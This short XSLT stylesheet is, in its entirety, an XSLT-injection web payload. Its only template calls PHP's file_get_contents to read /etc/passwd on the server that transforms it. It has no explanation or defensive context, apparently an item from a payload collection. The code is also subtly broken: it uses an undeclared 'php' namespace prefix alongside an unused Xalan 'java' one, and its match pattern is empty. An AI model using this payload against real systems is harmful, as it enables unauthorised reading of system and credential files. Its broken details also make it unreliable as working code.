<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://xml.apache.org/xalan/java">

  <xsl:template match="">
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>
  </xsl:template>

</xsl:stylesheet>
